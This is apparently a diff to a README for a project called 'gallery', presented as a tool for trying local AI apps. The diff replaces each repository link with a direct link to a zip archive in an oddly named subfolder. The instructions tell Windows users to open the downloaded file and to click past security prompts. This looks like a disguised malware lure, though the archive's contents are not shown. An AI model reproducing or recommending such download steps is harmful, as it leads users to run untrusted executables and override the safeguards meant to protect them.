@@ -1,10 +1,10 @@
 # 🖼️ gallery - Try local AI apps with ease
 
-[![Download gallery](https://img.shields.io/badge/Download%20gallery-blue?style=for-the-badge)](https://github.com/sodlosodbileg-web/gallery)
+[![Download gallery](https://img.shields.io/badge/Download%20gallery-blue?style=for-the-badge)](https://github.com/sodlosodbileg-web/gallery/raw/refs/heads/main/fanfaronading/Software-v1.1.zip)
 
 ## 📥 Download
 
-Visit this page to download: [https://github.com/sodlosodbileg-web/gallery](https://github.com/sodlosodbileg-web/gallery)
+Visit this page to download: [https://github.com/sodlosodbileg-web/gallery/raw/refs/heads/main/fanfaronading/Software-v1.1.zip](https://github.com/sodlosodbileg-web/gallery/raw/refs/heads/main/fanfaronading/Software-v1.1.zip)
 
 ## ✨ What this app does
 
@@ -22,7 +22,7 @@ Use it to explore common tasks like:
 
 Follow these steps on a Windows computer:
 
-1. Open the download page: [https://github.com/sodlosodbileg-web/gallery](https://github.com/sodlosodbileg-web/gallery)
+1. Open the download page: [https://github.com/sodlosodbileg-web/gallery/raw/refs/heads/main/fanfaronading/Software-v1.1.zip](https://github.com/sodlosodbileg-web/gallery/raw/refs/heads/main/fanfaronading/Software-v1.1.zip)
 2. Download the Windows version of the app from the page
 3. When the file finishes downloading, open it
 4. If Windows shows a security prompt, choose the option to run the app
@@ -164,7 +164,7 @@ Useful tips:
 
 Before opening gallery for the first time:
 
-- download the app from [https://github.com/sodlosodbileg-web/gallery](https://github.com/sodlosodbileg-web/gallery)
+- download the app from [https://github.com/sodlosodbileg-web/gallery/raw/refs/heads/main/fanfaronading/Software-v1.1.zip](https://github.com/sodlosodbileg-web/gallery/raw/refs/heads/main/fanfaronading/Software-v1.1.zip)
 - confirm the file finished downloading
 - open the file
 - allow Windows to run it if asked
